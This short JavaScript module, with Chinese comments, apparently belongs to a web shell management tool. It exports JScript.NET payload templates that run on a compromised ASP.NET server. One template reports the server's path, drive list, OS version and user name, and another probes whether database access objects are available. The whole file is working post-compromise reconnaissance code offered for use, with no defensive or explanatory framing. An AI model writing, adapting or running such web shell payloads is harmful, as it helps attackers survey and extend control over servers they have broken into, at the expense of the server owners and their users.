/**
 * 基础信息模板
 * ? 获取当前路径、盘符列表
 */

module.exports = () => ({
  info: {
    _: `var c=System.IO.Directory.GetLogicalDrives();Response.Write(Server.MapPath(".")+"\t");for(var i=0;i<=c.length-1;i++)Response.Write(c[i][0]+":");Response.Write("\t"+Environment.OSVersion+"\t");Response.Write(Environment.UserName);`
  },
  probedb: { // 检测数据库函数支持
    _: `function fe(S:String){try{new ActiveXObject(S);return 1;}catch(Exception){return 0;}};
    var n="Adodb.Connection|Adodb.RecordSet";
    n=n.Split("|");
    for(var i=0;i<n.length;i++)Response.Write(n[i]+"\\t"+fe(n[i])+"\\n");
    `.replace(/\n\s+/g, '')
  }
})